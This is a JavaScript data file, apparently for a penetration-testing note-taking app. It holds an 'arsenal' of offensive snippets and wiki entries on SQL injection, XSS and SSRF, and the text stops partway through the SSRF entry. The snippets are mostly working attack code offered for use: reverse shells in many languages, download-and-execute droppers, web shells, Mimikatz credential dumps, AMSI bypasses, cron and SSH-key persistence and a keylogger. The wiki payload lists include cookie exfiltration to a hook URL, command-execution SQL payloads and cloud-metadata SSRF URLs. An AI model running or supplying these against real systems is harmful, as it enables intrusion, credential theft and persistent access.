/* ==================== SECOND BRAIN DATA & LOGIC ==================== */

const SecondBrainData = {
    // --- ARSENAL (Snippets) ---
    snippets: [
        {
            id: 'snip-1',
            title: 'Python Port Scanner',
            lang: 'python',
            tags: ['network', 'recon'],
            code: 'import socket\n\nfor port in range(1, 1024):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    result = sock.connect_ex(("127.0.0.1", port))\n    if result == 0:\n        print(f"Port {port}: OPEN")\n    sock.close()'
        },
        {
            id: 'snip-2',
            title: 'Bash Reverse Shell',
            lang: 'bash',
            tags: ['shell', 'rce'],
            code: 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
        },
        {
            id: 'snip-3',
            title: 'SQLi Union Payload',
            lang: 'sql',
            tags: ['web', 'sqli'],
            code: "' UNION SELECT 1, database(), user(), 4 -- "
        },
        {
            id: 'snip-4',
            title: 'Powershell Download & Execute',
            lang: 'powershell',
            tags: ['windows', 'dropper'],
            code: "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1')"
        },
        {
            id: 'snip-5',
            title: 'Netcat Reverse Shell',
            lang: 'bash',
            tags: ['shell', 'rce'],
            code: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f'
        },
        {
            id: 'snip-6',
            title: 'Python Reverse Shell (One-Liner)',
            lang: 'python',
            tags: ['shell', 'rce'],
            code: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
        },
        {
            id: 'snip-7',
            title: 'PHP Reverse Shell (One-Liner)',
            lang: 'php',
            tags: ['shell', 'rce'],
            code: 'php -r \'$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");\''
        },
        {
            id: 'snip-8',
            title: 'Ruby Reverse Shell',
            lang: 'ruby',
            tags: ['shell', 'rce'],
            code: 'ruby -rsocket -e\'f=TCPSocket.open("10.10.10.10",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
        },
        {
            id: 'snip-9',
            title: 'Socat TTY Reverse Shell',
            lang: 'bash',
            tags: ['shell', 'tty'],
            code: 'socat file:`tty`,raw,echo=0 tcp-listen:4444\n# Target:\nsocat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444'
        },
        {
            id: 'snip-10',
            title: 'TTY Upgrade (Python)',
            lang: 'python',
            tags: ['shell', 'tty'],
            code: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'\n# Then: Ctrl+Z\n# stty raw -echo; fg'
        },
        {
            id: 'snip-11',
            title: 'PHP Web Shell (Minimal)',
            lang: 'php',
            tags: ['web', 'backdoor'],
            code: '<?php system($_GET["cmd"]); ?>'
        },
        {
            id: 'snip-12',
            title: 'ASPX Web Shell',
            lang: 'asp',
            tags: ['web', 'backdoor'],
            code: '<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>'
        },
        {
            id: 'snip-13',
            title: 'Certutil File Download',
            lang: 'powershell',
            tags: ['windows', 'transfer'],
            code: 'certutil.exe -urlcache -split -f "http://10.10.10.10/file.exe" file.exe'
        },
        {
            id: 'snip-14',
            title: 'Powershell File Download (IWR)',
            lang: 'powershell',
            tags: ['windows', 'transfer'],
            code: 'iwr -uri http://10.10.10.10/file.exe -OutFile c:\\windows\\temp\\file.exe'
        },
        {
            id: 'snip-15',
            title: 'LinPEAS / WinPEAS Download',
            lang: 'bash',
            tags: ['privesc', 'recon'],
            code: '# Linux\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Windows\niwr -uri https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -OutFile winPEAS.exe'
        },
        {
            id: 'snip-16',
            title: 'NodeJS Reverse Shell',
            lang: 'javascript',
            tags: ['shell', 'rce'],
            code: '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "10.10.10.10", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();'
        },
        {
            id: 'snip-17',
            title: 'Perl Reverse Shell',
            lang: 'perl',
            tags: ['shell', 'rce'],
            code: 'perl -e \'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
        },
        {
            id: 'snip-18',
            title: 'PowerShell Port Scan',
            lang: 'powershell',
            tags: ['windows', 'recon'],
            code: '1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "Port $_ is OPEN"} 2>$null'
        },
        {
            id: 'snip-19',
            title: 'Python HTTP Server',
            lang: 'python',
            tags: ['transfer', 'utility'],
            code: 'python3 -m http.server 8000\n# Python 2:\npython -m SimpleHTTPServer 8000'
        },
        {
            id: 'snip-20',
            title: 'Bash Ping Sweep',
            lang: 'bash',
            tags: ['recon', 'network'],
            code: 'for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "64 bytes" & done'
        },
        {
            id: 'snip-21',
            title: 'MSFVenom Windows Reverse Shell',
            lang: 'bash',
            tags: ['payload', 'windows'],
            code: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe'
        },
        {
            id: 'snip-22',
            title: 'MSFVenom Linux Reverse Shell',
            lang: 'bash',
            tags: ['payload', 'linux'],
            code: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf'
        },
        {
            id: 'snip-23',
            title: 'MSFVenom ASPX Web Shell',
            lang: 'bash',
            tags: ['payload', 'web'],
            code: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f aspx -o shell.aspx'
        },
        {
            id: 'snip-24',
            title: 'Stabilize Shell (Python)',
            lang: 'python',
            tags: ['shell', 'tty'],
            code: 'python3 -c \'import pty;pty.spawn("/bin/bash")\'\nexport TERM=xterm\n# Ctrl+Z\nstty raw -echo; fg'
        },
        {
            id: 'snip-25',
            title: 'SQLMap Basic Usage',
            lang: 'bash',
            tags: ['web', 'sqli'],
            code: 'sqlmap -u "http://target.com/vuln.php?id=1" --batch --dbs'
        },
        {
            id: 'snip-26',
            title: 'Hydra SSH Brute Force',
            lang: 'bash',
            tags: ['cracking', 'network'],
            code: 'hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh'
        },
        {
            id: 'snip-27',
            title: 'Gobuster Directory Scan',
            lang: 'bash',
            tags: ['web', 'recon'],
            code: 'gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -t 50'
        },
        {
            id: 'snip-28',
            title: 'Local Port Forwarding (SSH)',
            lang: 'bash',
            tags: ['pivoting', 'network'],
            code: 'ssh -L 8080:127.0.0.1:80 user@10.10.10.10'
        },
        {
            id: 'snip-29',
            title: 'Dynamic Port Forwarding (SOCKS)',
            lang: 'bash',
            tags: ['pivoting', 'network'],
            code: 'ssh -D 1080 user@10.10.10.10\n# Use with proxychains'
        },
        {
            id: 'snip-30',
            title: 'Mimikatz Dump Credentials',
            lang: 'powershell',
            tags: ['windows', 'post-exploitation'],
            code: 'privilege::debug\nsekurlsa::logonpasswords\nlsadump::lsa /patch'
        },
        {
            id: 'snip-31',
            title: 'Kerberoasting (PowerView)',
            lang: 'powershell',
            tags: ['active-directory', 'kerberos'],
            code: 'Get-NetUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv -NoTypeInformation .\\kerberoast.csv'
        },
        {
            id: 'snip-32',
            title: 'AS-REP Roasting (Rubeus)',
            lang: 'powershell',
            tags: ['active-directory', 'kerberos'],
            code: '.\\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt'
        },
        {
            id: 'snip-33',
            title: 'Chisel Client (Reverse Tunnel)',
            lang: 'bash',
            tags: ['pivoting', 'tunneling'],
            code: './chisel client 10.10.10.10:8000 R:socks'
        },
        {
            id: 'snip-34',
            title: 'Chisel Server (Reverse Tunnel)',
            lang: 'bash',
            tags: ['pivoting', 'tunneling'],
            code: './chisel server -p 8000 --reverse'
        },
        {
            id: 'snip-35',
            title: 'Golang Reverse Shell',
            lang: 'go',
            tags: ['shell', 'rce'],
            code: 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.10.10:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'
        },
        {
            id: 'snip-36',
            title: 'Mimikatz SAM Dump',
            lang: 'powershell',
            tags: ['windows', 'credentials'],
            code: 'privilege::debug\ntoken::elevate\nlsadump::sam'
        },
        {
            id: 'snip-37',
            title: 'Wifi Password Dump (Netsh)',
            lang: 'powershell',
            tags: ['windows', 'wifi'],
            code: 'netsh wlan show profiles name="*" key=clear'
        },
        {
            id: 'snip-38',
            title: 'Upgrading Shell to Meterpreter',
            lang: 'bash',
            tags: ['metasploit', 'shell'],
            code: 'use post/multi/manage/shell_to_meterpreter\nset SESSION 1\nrun'
        },
        {
            id: 'snip-39',
            title: 'Ligolo-ng (Agent Connect)',
            lang: 'bash',
            tags: ['pivoting', 'tunneling'],
            code: './agent -connect 10.10.10.10:11601 -ignore-cert'
        },
        {
            id: 'snip-40',
            title: 'Ligolo-ng (Proxy Interface)',
            lang: 'bash',
            tags: ['pivoting', 'tunneling'],
            code: 'sudo ip tuntap add user kali mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert'
        },
        {
            id: 'snip-41',
            title: 'CrackMapExec SMB Spray',
            lang: 'bash',
            tags: ['active-directory', 'spraying'],
            code: 'cme smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue-on-success'
        },
        {
            id: 'snip-42',
            title: 'BloodHound Ingestor (Python)',
            lang: 'bash',
            tags: ['active-directory', 'recon'],
            code: 'bloodhound-python -u user -p password -ns 192.168.1.5 -d domain.local -c all'
        },
        {
            id: 'snip-43',
            title: 'PowerShell AMSI Bypass (Reflection)',
            lang: 'powershell',
            tags: ['windows', 'evasion'],
            code: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)'
        },
        {
            id: 'snip-44',
            title: 'Docker Breakout (Privileged)',
            lang: 'bash',
            tags: ['container', 'privesc'],
            code: 'mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x'
        },
        {
            id: 'snip-45',
            title: 'AWS S3 Bucket List (CLI)',
            lang: 'bash',
            tags: ['cloud', 'aws'],
            code: 'aws s3 ls s3://bucket-name --recursive --no-sign-request'
        },
        {
            id: 'snip-46',
            title: 'Azure Blob Storage Enum',
            lang: 'powershell',
            tags: ['cloud', 'azure'],
            code: 'az storage blob list --account-name <name> --container-name <container> --output table'
        },
        {
            id: 'snip-47',
            title: 'GCP Storage Bucket Enum',
            lang: 'bash',
            tags: ['cloud', 'gcp'],
            code: 'gsutil ls -r gs://bucket-name'
        },
        {
            id: 'snip-48',
            title: 'Kubernetes Pod Enumeration',
            lang: 'bash',
            tags: ['cloud', 'k8s'],
            code: 'kubectl get pods --all-namespaces -o wide'
        },
        {
            id: 'snip-49',
            title: 'Tshark Credential Sniffing',
            lang: 'bash',
            tags: ['network', 'sniffing'],
            code: 'tshark -i eth0 -Y "http.request.method == POST" -T fields -e http.file_data'
        },
        {
            id: 'snip-50',
            title: 'Git History Credential Hunt',
            lang: 'bash',
            tags: ['recon', 'git'],
            code: 'git log -p | grep -E "password|secret|key|token"'
        },
        {
            id: 'snip-51',
            title: 'FFUF VHost Discovery',
            lang: 'bash',
            tags: ['web', 'recon'],
            code: 'ffuf -w /usr/share/wordlists/subdomains.txt -u http://target.com -H "Host: FUZZ.target.com" -fs 42'
        },
        {
            id: 'snip-52',
            title: 'Wfuzz XSS Fuzzing',
            lang: 'bash',
            tags: ['web', 'fuzzing'],
            code: 'wfuzz -c -z file,xss-payloads.txt -u "http://target.com?q=FUZZ" --hw 0'
        },
        {
            id: 'snip-53',
            title: 'SQLMap POST Request',
            lang: 'bash',
            tags: ['web', 'sqli'],
            code: 'sqlmap -r request.txt --batch --level=5 --risk=3'
        },
        {
            id: 'snip-54',
            title: 'Hashcat NTLM Cracking',
            lang: 'bash',
            tags: ['cracking', 'windows'],
            code: 'hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -O'
        },
        {
            id: 'snip-55',
            title: 'John the Ripper (Zip)',
            lang: 'bash',
            tags: ['cracking', 'archives'],
            code: 'zip2john encrypted.zip > hash.txt && john hash.txt --wordlist=rockyou.txt'
        },
        {
            id: 'snip-56',
            title: 'SSH Key Persistence',
            lang: 'bash',
            tags: ['persistence', 'linux'],
            code: 'echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'
        },
        {
            id: 'snip-57',
            title: 'Linux Cron Job Persistence',
            lang: 'bash',
            tags: ['persistence', 'linux'],
            code: '(crontab -l; echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\'") | crontab -'
        },
        {
            id: 'snip-58',
            title: 'Windows IsDebuggerPresent (C++)',
            lang: 'cpp',
            tags: ['malware', 'evasion'],
            code: 'if (IsDebuggerPresent()) { ExitProcess(0); }'
        },
        {
            id: 'snip-59',
            title: 'Python Simple Keylogger',
            lang: 'python',
            tags: ['malware', 'spyware'],
            code: 'import keyboard; keyboard.on_press(lambda e: open("log.txt", "a").write(e.name + " "))'
        },
        {
            id: 'snip-60',
            title: 'PHP Upload & Execute',
            lang: 'php',
            tags: ['web', 'backdoor'],
            code: '<?php move_uploaded_file($_FILES["f"]["tmp_name"], $_FILES["f"]["name"]); ?>'
        },
        {
            id: 'snip-61',
            title: 'Nmap Vulnerability Scan',
            lang: 'bash',
            tags: ['network', 'recon'],
            code: 'nmap -sV --script=vuln 10.10.10.10'
        },
        {
            id: 'snip-62',
            title: 'Metasploit Resource Script',
            lang: 'bash',
            tags: ['metasploit', 'automation'],
            code: 'use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 10.10.10.10\nset LPORT 4444\nrun -j'
        },
        {
            id: 'snip-63',
            title: 'Socat Encrypted Bind Shell',
            lang: 'bash',
            tags: ['shell', 'encrypted'],
            code: '# Target\nsocat OPENSSL-LISTEN:4444,cert=bind.pem,verify=0,fork EXEC:/bin/bash\n# Attacker\nsocat - OPENSSL:target:4444,verify=0'
        },
        {
            id: 'snip-64',
            title: 'MySQL UDF Exploitation',
            lang: 'sql',
            tags: ['database', 'privesc'],
            code: 'create table foo(line blob); insert into foo values(load_file("/tmp/lib_mysqludf_sys.so")); select * from foo into dumpfile "/usr/lib/mysql/plugin/lib_mysqludf_sys.so"; create function sys_exec returns integer soname "lib_mysqludf_sys.so"; select sys_exec("cp /bin/bash /tmp/bash; chmod +s /tmp/bash");'
        },
        {
            id: 'snip-65',
            title: 'Powershell AMSI Bypass (Memory Patch)',
            lang: 'powershell',
            tags: ['windows', 'evasion'],
            code: '$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields("NonPublic,Static");Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[System.Runtime.InteropServices.Marshal]::WriteInt32($ptr,0x41414141)'
        }
    ],

    // --- WIKI (Vulnerabilities) ---
    wiki: [
        {
            id: 'wiki-1',
            title: 'SQL Injection (SQLi)',
            category: 'Injection',
            severity: 'Critical',
            cvss: '9.8',
            cwe: 'CWE-89',
            owasp: 'A03:2021 – Injection',
            description: 'SQL Injection (SQLi) is a code injection technique that exploits security vulnerabilities in an application\'s database layer. Attackers can inject malicious SQL statements into input fields, allowing them to manipulate database queries, bypass authentication, extract sensitive data, modify or delete data, and in some cases achieve remote code execution on the underlying operating system.',
            technicalDetails: {
                mechanism: 'SQL injection occurs when user-supplied input is concatenated directly into SQL queries without proper sanitization or parameterization. This allows attackers to break out of the intended query structure and inject arbitrary SQL commands.',
                commonVulnerablePoints: [
                    'Login forms and authentication mechanisms',
                    'Search fields and filters',
                    'GET/POST parameters in web requests',
                    'HTTP headers (User-Agent, Referer, Cookie)',
                    'API endpoints accepting user input',
                    'URL query strings'
                ],
                databaseSpecific: {
                    mysql: 'Supports UNION, stacked queries, file operations (LOAD_FILE, INTO OUTFILE)',
                    postgresql: 'Advanced features like COPY TO PROGRAM for RCE, powerful string functions',
                    mssql: 'xp_cmdshell for command execution, OPENROWSET for reading files',
                    oracle: 'UTL_HTTP for SSRF, complex syntax with dual table',
                    sqlite: 'Limited but supports ATTACH DATABASE for file operations'
                }
            },
            impact: {
                confidentiality: 'Complete data breach - extraction of all database contents including passwords, personal information, financial data, and proprietary business information',
                integrity: 'Data manipulation - attackers can modify, insert, or delete critical records, leading to data corruption and loss of trust',
                availability: 'Service disruption through database deletion (DROP TABLE), resource exhaustion, or denial of service attacks',
                businessImpact: 'Severe reputational damage, regulatory fines (GDPR, PCI-DSS), legal liability, customer loss, and potential complete business shutdown in critical cases'
            },
            exploitation: {
                reconnaissance: [
                    'Identify input points that interact with database',
                    'Detect error messages revealing database type and version',
                    'Use timing attacks to confirm blind injection',
                    'Map application structure and identify injectable parameters'
                ],
                techniques: [
                    'UNION-based: Extract data by combining malicious queries with legitimate ones',
                    'Error-based: Trigger database errors to extract information',
                    'Boolean-based Blind: Infer data through true/false conditions',
                    'Time-based Blind: Use SLEEP/WAITFOR to detect injection',
                    'Out-of-band: Exfiltrate data via DNS, HTTP, or SMB requests',
                    'Second-order: Inject payload that executes in different context'
                ],
                advanced: [
                    'WAF bypass using comment obfuscation (/**/)',
                    'Case manipulation and whitespace variations',
                    'Encoding techniques (URL, Unicode, Hex)',
                    'Stacked queries for multiple statement execution',
                    'Privilege escalation to DBA/sysadmin roles'
                ]
            },
            remediation: {
                immediate: [
                    'Implement parameterized queries (prepared statements) for all database interactions',
                    'Use ORM frameworks with built-in protections',
                    'Deploy Web Application Firewall (WAF) with SQLi rulesets',
                    'Disable detailed error messages in production'
                ],
                longTerm: [
                    'Principle of least privilege for database accounts',
                    'Input validation using whitelist approach',
                    'Regular security audits and penetration testing',
                    'Implement stored procedures with proper permissions',
                    'Database activity monitoring and anomaly detection',
                    'Code review focusing on database query construction'
                ],
                codeExample: `// Vulnerable Code
String query = "SELECT * FROM users WHERE username = '" + userInput + "'";

// Secure Code (Parameterized Query)
PreparedStatement pstmt = connection.prepareStatement("SELECT * FROM users WHERE username = ?");
pstmt.setString(1, userInput);`
            },
            testing: {
                manual: [
                    "Test with single quote (') to trigger syntax errors",
                    "Use UNION SELECT to enumerate columns and tables",
                    "Try time-based payloads: ' OR SLEEP(5)--",
                    "Test different comment styles: --, #, /* */",
                    "Attempt stacked queries with semicolons"
                ],
                automated: [
                    'SQLmap: Comprehensive automated SQLi detection and exploitation',
                    'Burp Suite Scanner: Integrated SQLi detection',
                    'OWASP ZAP: Active and passive scanning',
                    'NoSQLMap: For NoSQL injection testing'
                ],
                payload: "' OR '1'='1' -- "
            },
            vectors: ['Union Based', 'Error Based', 'Blind', 'Time Based', 'Out-of-Band', 'Second-Order'],
            tools: ['SQLmap', 'Burp Suite', 'NoSQLMap', 'jSQL Injection', 'Havij'],
            payloads: [
                "' OR 1=1 --",
                "' UNION SELECT null, version() --",
                "[[USER]]' --",
                "' UNION SELECT [[COL1]], [[COL2]] FROM [[TABLE]] --",
                "-1' UNION SELECT 1,2,3 --",
                "1; DROP TABLE [[TABLE]]",
                "' OR '1'='1' /*",
                "admin' #",
                "' HAVING 1=1 --",
                "' AND (SELECT 1 FROM (SELECT count(*), concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
                "PgSQL: '; COPY (SELECT *) TO PROGRAM 'nslookup [[OOB_DNS]]'--",
                "MSSQL: '; EXEC xp_cmdshell('[[CMD]]')--",
                "Oracle: ' UNION SELECT null, null, banner FROM v$version--"
            ],
            builderConfig: [
                { id: 'USER', label: 'Target Username', placeholder: 'admin' },
                { id: 'TABLE', label: 'Database Table', placeholder: 'users' },
                { id: 'COL1', label: 'Column 1', placeholder: 'username' },
                { id: 'COL2', label: 'Column 2', placeholder: 'password' },
                { id: 'OOB_DNS', label: 'OOB DNS Server', placeholder: 'dns.attacker.com' },
                { id: 'CMD', label: 'System Command', placeholder: 'whoami' }
            ],
            reports: [
                { title: 'H1: SQLi in Login via User-Agent', url: 'https://hackerone.com/reports/297478', bounty: '$5,000', severity: 'Critical' },
                { title: 'Uber: Blind SQLi in API', url: 'https://hackerone.com/reports/395646', bounty: '$10,000', severity: 'Critical' },
                { title: 'Yahoo: Authentication Bypass via SQLi', url: 'https://hackerone.com/reports/150156', bounty: '$15,000', severity: 'Critical' }
            ]
        },
        {
            id: 'wiki-2',
            title: 'Cross-Site Scripting (XSS)',
            category: 'Client-Side',
            severity: 'High',
            cvss: '6.1',
            cwe: 'CWE-79',
            owasp: 'A03:2021 – Injection',
            description: 'Cross-Site Scripting (XSS) is a client-side code injection attack. The attacker aims to execute malicious scripts in the web browser of the victim by including malicious code in a legitimate web page or web application.',
            technicalDetails: {
                mechanism: 'XSS occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows the browser to execute the data as code.',
                commonVulnerablePoints: [
                    'Search input fields reflecting query parameters',
                    'Comment sections and forums (Stored XSS)',
                    'User profile fields (bio, name)',
                    'URL parameters dealing with error messages',
                    'DOM sinks like innerHTML, document.write, location.href'
                ],
                databaseSpecific: {
                    'Reflected': 'Payload comes from the current HTTP request.',
                    'Stored': 'Payload is stored in the database and served to victims.',
                    'DOM-based': 'Vulnerability exists in client-side code rather than server-side.'
                }
            },
            impact: {
                confidentiality: 'Stealing session cookies, auth tokens, and local storage data.',
                integrity: 'Modifying page content (defacement), redirecting users to phishing sites.',
                availability: 'Crashing the browser, redirecting to non-existent pages, infinite loops.',
                businessImpact: 'Account takeover, reputation damage, malware distribution via site.'
            },
            exploitation: {
                reconnaissance: [
                    'Identify all input vectors reflecting data.',
                    'Test for special character filtering (< > " \' /).',
                    'Check context (HTML body, attribute, JS variable).'
                ],
                techniques: [
                    'Basic script injection <script>alert(1)</script>',
                    'Event handlers <img onerror=alert(1)>',
                    'Protocol handlers javascript:alert(1)',
                    'SVG onload events <svg/onload=alert(1)>'
                ],
                advanced: [
                    'Polyglots to break multiple contexts',
                    'WAF bypass using non-alphanumeric payloads (JSFuck)',
                    'Dangling markup injection',
                    'Prototype pollution chaining'
                ]
            },
            remediation: {
                immediate: [
                    'Context-sensitive output encoding/escaping.',
                    'Content Security Policy (CSP) implementation.',
                    'HttpOnly flag for session cookies.'
                ],
                longTerm: [
                    'Use modern frameworks (React, Vue, Angular) that auto-escape.',
                    'Implement strict CSP with nonces.',
                    'Regular security training for developers.',
                    'Sanitization libraries (DOMPurify) for rich text.'
                ],
                codeExample: `// Vulnerable
document.getElementById('name').innerHTML = urlParams.get('name');

// Secure (Text Content)
document.getElementById('name').textContent = urlParams.get('name');

// Secure (DOMPurify for HTML)
document.getElementById('content').innerHTML = DOMPurify.sanitize(dirty);`
            },
            testing: {
                manual: [
                    'Inject unique string and search in source code.',
                    'Test breaking out of HTML tags / attributes.',
                    'Verify if script executes (alert/print/console.log).',
                    'Check if payload persists (Stored XSS).'
                ],
                automated: [
                    'Burp Suite Scanner',
                    'XSStrike',
                    'Dalfox',
                    'OWASP ZAP'
                ],
                payload: "\"><script>alert(1)</script>"
            },
            vectors: ['Stored', 'Reflected', 'DOM-Based'],
            tools: ['XSSer', 'XSStrike', 'Burp Suite'],
            payloads: [
                "<script>alert('[[MSG]]')</script>",
                "<img src=x onerror=alert('[[MSG]]')>",
                "<svg onload=alert('[[MSG]]')>",
                "javascript:alert('[[MSG]]')",
                "\"><script>fetch('[[HOOK_URL]]?c='+document.cookie)</script>",
                "<body onload=alert('[[MSG]]')>",
                "<iframe src='[[URL]]'>",
                "<input onfocus=alert('[[MSG]]') autofocus>",
                "<details ontoggle=alert('[[MSG]]')>",
                "Polyglot: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                "Angular: {{constructor.constructor('alert(\"[[MSG]]\")')()}}",
                "Vue: <div v-html=\"'alert(\"[[MSG]]\")'\" ></div>",
                "React: <a href='javascript:alert(\"[[MSG]]\" )'>Clickme</a>"
            ],
            builderConfig: [
                { id: 'MSG', label: 'Alert Message', placeholder: 'XSS' },
                { id: 'HOOK_URL', label: 'Hook/Exfil URL', placeholder: 'https://hookb.in/xxxxx' },
                { id: 'URL', label: 'Target URL', placeholder: 'javascript:alert(1)' }
            ],
            reports: [
                { title: 'Google: Stored XSS in Google Docs', url: 'https://hackerone.com/reports/123456', bounty: '$3,133' },
                { title: 'Twitter: DOM XSS via Analytics', url: 'https://hackerone.com/reports/555555', bounty: '$2,500' }
            ]
        },
        {
            id: 'wiki-3',
            title: 'Server-Side Request Forgery (SSRF)',
            category: 'Server-Side',
            severity: 'Critical',
            cvss: '9.1',
            cwe: 'CWE-918',
            owasp: 'A10:2021 – SSRF',
            description: 'Server-Side Request Forgery (SSRF) occurs when a web application is trying to fetch a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).',
            technicalDetails: {
                mechanism: 'The vulnerability arises when an application takes user input to construct a URL that the backend server then fetches. Because the request originates from the trusted server itself, it can bypass network perimeter controls.',
                commonVulnerablePoints: [
                    'Webhook integrations and notifications',
                    'File import/upload via URL features',
                    'Link preview generators',
                    'Proxy services and PDF generators',
                    'Database connection strings'
                ],
                databaseSpecific: {
                    'Cloud Environments': 'Access to metadata services (AWS, GCP, Azure, DO).',
                    'Internal Services': 'Access to internal APIs, databases (Redis, Mongo), and admin panels.',
                    'Protocol Smuggling': 'Using Gopher/dict to speak binary protocols like Redis/SMTP.'
                }
            },
            impact: {
                confidentiality: 'Access to cloud metadata keys, internal files, and database schemas.',
                integrity: 'Modification of internal data, interacting with internal APIs.',
                availability: 'DoS of internal services, resource exhaustion.',
                businessImpact: 'Full infrastructure compromise, data breach (Capital One style), pivot to internal network.'
            },
            exploitation: {
                reconnaissance: [
                    'Identify features that fetch external resources (webhooks, avatar upload).',
                    'Test for loopback access (localhost, 127.0.0.1, 0.0.0.0, [::]).',
                    'Check for DNS resolution behavior (Burp Collaborator).'
                ],
                techniques: [
                    'Basic loopback access: http://127.0.0.1:8080/admin',
                    'Cloud Metadata: http://169.254.169.254/latest/meta-data/',
                    'Bypass filters: http://2130706433/ (Decimal IP)',
                    'Protocol wrapping: file://, gopher://, dict://, netdoc://'
                ],
                advanced: [
                    'DNS Rebinding to bypass TTL checks',
                    'Gopher protocol to exploit Redis/Memcached',
                    'Redirect-based SSRF (using an external redirector)',
                    'Blind SSRF timing attacks'
                ]
            },
            remediation: {
                immediate: [
                    'Validate and sanitize all user-supplied URLs.',
                    'Disable support for unused URL schemas (file://, gopher://).',
                    'Implement a whitelist of allowed domains/IPs.'
                ],
                longTerm: [
                    'Network segmentation: Isolate public-facing servers from internal resources.',
                    'Use a dedicated proxy service for outgoing requests.',
                    'Metadata service protection (IMDSv2 on AWS).',
                    'Disable HTTP redirects in the fetching library.'
                ],
                codeExample: `// Vulnerable
const res = await fetch(req.query.url);

// Secure (Whitelist)
const allowedHosts = ['api.example.com', 'partner.com'];
const url = new URL(req.query.url);
if (!allowedHosts.includes(url.hostname)) {
    throw new Error('Invalid host');
}`
            },
            testing: {
                manual: [
                    'Input private IP addresses (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16).',
                    'Test cloud metadata URLs.',
                    'Use Burp Collaborator to detect blind SSRF interaction.',
                    'Fuzz with different URL schemes.'
                ],
                automated: [
                    'SSRFmap',
                    'Gopherus (for payload generation)',
                    'Burp Suite Scanner',
                    'Collaborator'
                ],
                payload: "http://169.254.169.254/latest/meta-data/"
            },
            vectors: ['Internal Port Scanning', 'Cloud Metadata Access'],
            tools: ['SSRFmap', 'Gopherus'],
            payloads: [
                "http://[[IP]]/[[PATH]]",
                "http://169.254.169.254/latest/meta-data/",
                "file:///[[FILE]]",
                "http://localhost:[[PORT]]",
                "gopher://[[IP]]:[[PORT]]/_AUTH%20[[PASS]]",
                "http://[::]:80/",
                "http://0.0.0.0:80",
                "http://2130706433/",
                "AWS: http://169.254.169.254/latest/user-data/",
                "GCP: http://metadata.google.internal/computeMetadata/v1/ -H 'Metadata-Flavor: Google'",
                "Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H 'Metadata: true'",
                "DigitalOcean: http://169.254.169.254/metadata/v1.json"
            ],
            builderConfig: [
                { id: 'IP', label: 'Internal IP', placeholder: '127.0.0.1' },
                { id: 'PATH', label: 'Target Path', placeholder: 'admin' },
                { id: 'FILE', label: 'File Path', placeholder: 'etc/passwd' },
                { id: 'PORT', label: 'Port Number', placeholder: '22' },
                { id: 'PASS', label: 'Password', placeholder: 'password' }
            ],
            reports: [
